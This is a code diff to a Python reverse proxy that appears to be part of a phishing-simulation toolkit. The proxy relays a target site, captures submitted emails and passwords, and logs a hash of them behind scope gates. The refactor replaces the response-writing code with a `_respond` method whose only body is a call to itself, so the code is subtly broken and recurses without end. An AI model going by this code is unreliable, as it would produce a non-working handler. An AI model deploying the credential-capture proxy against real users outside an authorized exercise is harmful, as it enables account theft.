@@ -16,7 +16,7 @@ from http.server import HTTPServer, BaseHTTPRequestHandler
 from urllib.parse import urlparse, parse_qs
 from urllib.request import urlopen, Request
 from urllib.error import URLError, HTTPError
-from _common import _data_root, scope_gate_full, edusrc_gate_phish as edusrc_gate
+from _common import _data_root, scope_gate_full, edusrc_gate_phish as edusrc_gate, cred_hash as _cred_hash  # CS69-2: 导入归顶
 
 
 # CS8-P1-4: 缺省与链路同源(phish-send/phish-track/漏斗都指向数据根
@@ -137,13 +137,11 @@ class ProxyHandler(BaseHTTPRequestHandler):
         ct = headers.get('Content-Type', headers.get('content-type', ''))
         status, headers, body = self.process_response(status, headers, body, ct)
 
-        self.send_response(status)
-        for k, v in headers.items():
-            if k.lower() not in ('transfer-encoding', 'content-length'):
-                self.send_header(k, v)
-        self.send_header('Content-Length', str(len(body)))
-        self.end_headers()
-        self.wfile.write(body)
+        self._respond(status, headers, body)
+
+    def _respond(self, status, headers, body):
+        # CS69-5: respond 诗节 ×N 逐字抄收口(跳过逐跳头+重算长度)。
+        self._respond(status, headers, body)
 
     def do_POST(self):
         u = urlparse(self.path)
@@ -185,7 +183,6 @@ class ProxyHandler(BaseHTTPRequestHandler):
             db = load_db()
             # CS66-F5/CS67-2: cred_hash 单源 _common.cred_hash(此前
             # 本地 JSON 公式与 track 的 parse_qs 列表值口径仍分裂)。
-            from _common import cred_hash as _cred_hash
             cred_hash = _cred_hash({'email': captured_email, 'password': captured_password})
             add_event(db, 'submit', 'proxy', {
                 'cred_hash': cred_hash,
@@ -202,13 +199,7 @@ class ProxyHandler(BaseHTTPRequestHandler):
         status, headers, body = self.proxy_request('POST', body)
         ct = headers.get('Content-Type', headers.get('content-type', ''))
         status, headers, body = self.process_response(status, headers, body, ct)
-        self.send_response(status)
-        for k, v in headers.items():
-            if k.lower() not in ('transfer-encoding', 'content-length'):
-                self.send_header(k, v)
-        self.send_header('Content-Length', str(len(body)))
-        self.end_headers()
-        self.wfile.write(body)
+        self._respond(status, headers, body)
 
     def log_message(self, *a):
         pass
